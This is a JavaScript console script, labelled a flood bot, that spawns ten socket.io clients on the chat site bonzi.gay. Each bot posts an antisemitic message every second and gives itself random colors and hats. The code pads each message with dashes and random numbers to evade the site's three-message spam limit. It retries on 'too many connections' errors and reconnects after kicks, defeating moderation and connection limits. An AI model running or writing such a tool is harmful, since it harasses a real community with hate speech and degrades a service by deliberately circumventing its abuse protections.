// Bonzi.gay Flood Bot - Duplicate Clone Bots with BonziData Integration
(() => {
  // Import BonziData structure from bonzi.gay
  const BonziData = {
    colors: ["black", "blue", "brown", "cyan", "green", "pink", "purple", "red", "white", "yellow", "blessed", "noob", "glow", "pope"],
    hats: ["bear", "bfdi", "bieber", "bowtie", "bucket", "chain", "cigar", "dank", "elon", "evil", "horse", "illuminati", "kamala", "king", "maga", "obama", "pot", "propeller", "tophat", "troll", "truck", "witch", "wizard"]
  };
  
  const maxBots = 10; // Maximum number of bots to spawn
  const spawnDelay = 1500; // Delay between spawning new bots (ms)
  const messageDelay = 1000; // Delay between messages (ms)
  const autorejoin = true; // Auto-reconnect if disconnected
  
  // Custom message to spam
  const baseMessage = "ME JEWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW ";
  
  let botCount = 0;
  
  // Random selection helpers
  function randomColor() {
    return BonziData.colors[Math.floor(Math.random() * BonziData.colors.length)];
  }
  
  function randomHat() {
    return BonziData.hats[Math.floor(Math.random() * BonziData.hats.length)];
  }
  
  function spawnBot(botId) {
    try {
      // Connection bypass: Use forceNew and randomized reconnection
      const socket = io("https://bonzi.gay/", {
        forceNew: true,
        reconnection: true,
        reconnectionDelay: 1000 + Math.random() * 2000,
        reconnectionAttempts: 10,
        timeout: 20000,
        transports: ['websocket', 'polling']
      });
      
      socket.on('connect', () => {
        console.log(`✓ Bot #${botId} connected to bonzi.gay`);
        
        socket.emit("client", "MAIN");
        socket.emit("login", {
          passcode: "",
          name: "Anonymous",
          room: "default"
        });
        
        // Set random color and hat from BonziData
        const botColor = randomColor();
        const botHat = randomHat();
        
        socket.emit("command", {
          list: ["color", botColor]
        });
        
        socket.emit("command", {
          list: ["hat", botHat]
        });
        
        console.log(`🎨 Bot #${botId} spawned as ${botColor} with ${botHat} hat`);
        
        // Start spamming messages with bypass
        setTimeout(() => {
          let dashCount = 0;
          setInterval(() => {
            // Add dashes to bypass the 3-message limit
            const bypass = '-'.repeat(dashCount % 10);
            socket.emit('talk', {
              text: baseMessage + bypass + Math.floor(Math.random() * 3000)
            });
            dashCount++;
            
            // Randomly change color and hat every 10 messages for chaos
            if (dashCount % 10 === 0) {
              socket.emit("command", { list: ["color", randomColor()] });
              socket.emit("command", { list: ["hat", randomHat()] });
            }
          }, messageDelay);
        }, 500);
      });
      
      socket.on('connect_error', (error) => {
        console.error(`✗ Bot #${botId} connection failed:`, error.message);
      });
      
      socket.on('error', (error) => {
        if (error.includes && error.includes('too many connections')) {
          console.log(`⚠️ Bot #${botId}: Too many connections - retrying in ${3000 + botId * 500}ms...`);
          setTimeout(() => spawnBot(botId), 3000 + botId * 500);
        } else {
          console.error(`✗ Bot #${botId} error:`, error);
        }
      });
      
      socket.on('disconnect', (reason) => {
        console.log(`Bot #${botId} disconnected: ${reason}`);
        if (autorejoin && reason === 'io server disconnect') {
          // Server kicked us, try to reconnect with delay
          setTimeout(() => socket.connect(), 2000 + Math.random() * 3000);
        }
      });
      
    } catch (error) {
      console.error(`Failed to spawn bot #${botId}:`, error);
    }
  }
  
  // Spawn bots at intervals
  const spawner = setInterval(() => {
    botCount++;
    spawnBot(botCount);
    console.log(`Spawned bot #${botCount}/${maxBots}`);
    
    if (botCount >= maxBots) {
      clearInterval(spawner);
      console.log(`✓ All ${maxBots} bots spawned!`);
    }
  }, spawnDelay);
  
  console.log("=== BONZI.GAY FLOOD BOT STARTED ===");
  console.log(`Max bots: ${maxBots}`);
  console.log(`Spawn delay: ${spawnDelay}ms`);
  console.log(`Message delay: ${messageDelay}ms`);
  console.log(`Message: "${baseMessage}[bypass][random]"`);
  console.log("====================================");
  console.log("✓ BonziData integration: ENABLED");
  console.log("✓ Message bypass: ENABLED");
  console.log("✓ Connection bypass: ENABLED");
  console.log("✓ Auto-rejoin: ENABLED");
  console.log("✓ Random colors/hats: ENABLED");
  console.log(`Bots will spam every ${messageDelay}ms with color/hat changes`);
  console.log("⚠️ Connection limit bypass active - will retry on 'too many connections' error");
})();
